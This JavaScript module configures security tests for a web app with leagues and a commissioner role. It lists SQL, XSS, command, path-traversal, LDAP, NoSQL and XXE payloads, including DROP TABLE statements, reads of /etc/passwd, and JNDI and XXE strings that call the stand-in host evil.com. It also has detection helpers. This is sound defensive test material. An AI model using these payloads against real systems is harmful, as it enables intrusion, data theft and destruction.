/**
 * Security Testing Configuration
 * Configuration for security and vulnerability testing
 */

export const securityConfig = {
  // Base configuration
  baseUrl: process.env.BASE_URL || 'http://localhost:3000',
  apiUrl: process.env.API_URL || 'http://localhost:3000/api',
  
  // Test user configurations
  testUsers: {
    admin: {
      email: 'admin@test.com',
      username: 'admin',
      password: 'AdminTest123!',
      role: 'admin'
    },
    user: {
      email: 'user@test.com', 
      username: 'testuser',
      password: 'UserTest123!',
      role: 'user'
    },
    commissioner: {
      email: 'commissioner@test.com',
      username: 'commissioner',
      password: 'CommissionerTest123!',
      role: 'commissioner'
    }
  },

  // Security test scenarios
  testScenarios: {
    // OWASP Top 10 tests
    injection: {
      enabled: true,
      targets: [
        '/api/auth/login',
        '/api/leagues',
        '/api/users/search',
        '/api/players/search'
      ],
      payloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --",
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<%=7*7%>",
        "{%raw%}{{7*7}}{%endraw%}"
      ]
    },

    authentication: {
      enabled: true,
      tests: [
        'broken_authentication',
        'session_management',
        'password_policy',
        'brute_force_protection',
        'jwt_security'
      ]
    },

    authorization: {
      enabled: true,
      tests: [
        'privilege_escalation',
        'idor', // Insecure Direct Object References
        'missing_access_controls',
        'role_based_access'
      ]
    },

    dataExposure: {
      enabled: true,
      tests: [
        'sensitive_data_exposure',
        'information_disclosure',
        'error_message_leakage',
        'debug_information'
      ]
    },

    securityMisconfiguration: {
      enabled: true,
      tests: [
        'security_headers',
        'cors_configuration',
        'ssl_tls_configuration',
        'directory_traversal',
        'file_upload_security'
      ]
    },

    xmlExternalEntities: {
      enabled: true,
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.xml">]><root>&test;</root>'
      ]
    },

    deserializationFlaws: {
      enabled: true,
      tests: [
        'unsafe_deserialization',
        'object_injection'
      ]
    },

    vulnerableComponents: {
      enabled: true,
      tests: [
        'dependency_check',
        'outdated_libraries'
      ]
    },

    loggingMonitoring: {
      enabled: true,
      tests: [
        'insufficient_logging',
        'log_injection',
        'monitoring_failures'
      ]
    }
  },

  // Rate limiting and DoS tests
  rateLimiting: {
    enabled: true,
    endpoints: [
      '/api/auth/login',
      '/api/auth/signup', 
      '/api/leagues',
      '/api/password-reset'
    ],
    requestsPerMinute: 100,
    burstRequests: 20
  },

  // Input validation tests
  inputValidation: {
    enabled: true,
    fields: [
      'email',
      'username',
      'password',
      'league_name',
      'team_name',
      'player_search'
    ],
    testCases: [
      'boundary_values',
      'special_characters',
      'unicode_characters',
      'null_values',
      'empty_values',
      'very_long_values'
    ]
  },

  // HTTP security headers
  securityHeaders: {
    required: [
      'X-Frame-Options',
      'X-Content-Type-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
      'Content-Security-Policy',
      'Referrer-Policy'
    ],
    forbidden: [
      'Server',
      'X-Powered-By',
      'X-AspNet-Version',
      'X-AspNetMvc-Version'
    ]
  },

  // Session security
  sessionSecurity: {
    sessionTimeout: 3600, // 1 hour
    secureCookies: true,
    httpOnlyCookies: true,
    sameSiteCookies: 'strict'
  },

  // Reporting configuration
  reporting: {
    outputFormat: ['json', 'html', 'csv'],
    severity: ['critical', 'high', 'medium', 'low', 'info'],
    includeRemediation: true,
    exportPath: './security-reports/'
  }
};

// Common payloads for different attack types
export const attackPayloads = {
  sqlInjection: [
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL,username,password FROM users --",
    "admin'--",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1--",
    "') OR '1'='1--",
    "') OR ('1'='1--"
  ],

  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "'><script>alert('XSS')</script>"
  ],

  commandInjection: [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; ls -la",
    "| whoami",
    "& id"
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..//..//..//etc//passwd",
    "....\\\\....\\\\....\\\\etc\\\\passwd"
  ],

  ldapInjection: [
    "*",
    "*)(&",
    "*))%00",
    "*(|(mail=*))",
    "*)(uid=*))(|(uid=*",
    "admin*)((|userPassword=*)",
    "admin*)((|userId=*))"
  ],

  nosqlInjection: [
    "true, true",
    "{\"$gt\": \"\"}",
    "{\"$ne\": null}",
    "{\"$regex\": \".*\"}",
    "'; return true; //",
    "'; return db.users.find(); //",
    "{\"$where\": \"return true\"}",
    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
  ]
};

// Test data generators
export function generateMaliciousPayloads(type) {
  switch (type) {
    case 'sql':
      return attackPayloads.sqlInjection;
    case 'xss':
      return attackPayloads.xss;
    case 'command':
      return attackPayloads.commandInjection;
    case 'path':
      return attackPayloads.pathTraversal;
    case 'ldap':
      return attackPayloads.ldapInjection;
    case 'nosql':
      return attackPayloads.nosqlInjection;
    default:
      return [];
  }
}

export function generateTestUser(index, role = 'user') {
  return {
    email: `sectest${index}@example.com`,
    username: `sectest${index}`,
    password: 'SecTest123!',
    firstName: `SecTest${index}`,
    lastName: 'User',
    role: role
  };
}

// Security test utilities
export const securityUtils = {
  // Check if response contains sensitive information
  checkSensitiveDataExposure: (response) => {
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /token/i,
      /key/i,
      /credit.?card/i,
      /ssn/i,
      /social.?security/i,
      /api.?key/i,
      /private.?key/i
    ];

    const body = response.body || '';
    const headers = JSON.stringify(response.headers || {});

    return sensitivePatterns.some(pattern => 
      pattern.test(body) || pattern.test(headers)
    );
  },

  // Check if error messages leak information
  checkErrorInformationLeakage: (response) => {
    const leakagePatterns = [
      /stack trace/i,
      /sql error/i,
      /database error/i,
      /file not found/i,
      /permission denied/i,
      /internal server error.*at/i,
      /exception.*at.*line/i,
      /mysql.*error/i,
      /postgresql.*error/i,
      /mongodb.*error/i
    ];

    const body = response.body || '';
    return leakagePatterns.some(pattern => pattern.test(body));
  },

  // Validate security headers
  validateSecurityHeaders: (response) => {
    const headers = response.headers || {};
    const issues = [];

    // Required headers
    const requiredHeaders = securityConfig.securityHeaders.required;
    requiredHeaders.forEach(header => {
      if (!headers[header.toLowerCase()]) {
        issues.push(`Missing security header: ${header}`);
      }
    });

    // Forbidden headers (information disclosure)
    const forbiddenHeaders = securityConfig.securityHeaders.forbidden;
    forbiddenHeaders.forEach(header => {
      if (headers[header.toLowerCase()]) {
        issues.push(`Information disclosure header present: ${header}`);
      }
    });

    return issues;
  },

  // Check for CORS misconfigurations
  checkCorsConfiguration: (response) => {
    const headers = response.headers || {};
    const issues = [];

    const accessControlAllowOrigin = headers['access-control-allow-origin'];
    if (accessControlAllowOrigin === '*') {
      issues.push('Overly permissive CORS policy: Access-Control-Allow-Origin: *');
    }

    const accessControlAllowCredentials = headers['access-control-allow-credentials'];
    if (accessControlAllowCredentials === 'true' && accessControlAllowOrigin === '*') {
      issues.push('Dangerous CORS configuration: credentials allowed with wildcard origin');
    }

    return issues;
  },

  // Generate security report
  generateSecurityReport: (testResults) => {
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        totalTests: 0,
        passed: 0,
        failed: 0,
        critical: 0,
        high: 0,
        medium: 0,
        low: 0
      },
      vulnerabilities: [],
      recommendations: []
    };

    testResults.forEach(result => {
      report.summary.totalTests++;
      
      if (result.passed) {
        report.summary.passed++;
      } else {
        report.summary.failed++;
        
        switch (result.severity) {
          case 'critical':
            report.summary.critical++;
            break;
          case 'high':
            report.summary.high++;
            break;
          case 'medium':
            report.summary.medium++;
            break;
          case 'low':
            report.summary.low++;
            break;
        }

        report.vulnerabilities.push(result);
      }
    });

    // Generate recommendations based on vulnerabilities found
    if (report.summary.critical > 0) {
      report.recommendations.push('Address critical vulnerabilities immediately before production deployment');
    }
    
    if (report.summary.high > 0) {
      report.recommendations.push('High severity issues should be resolved within 24-48 hours');
    }

    return report;
  }
};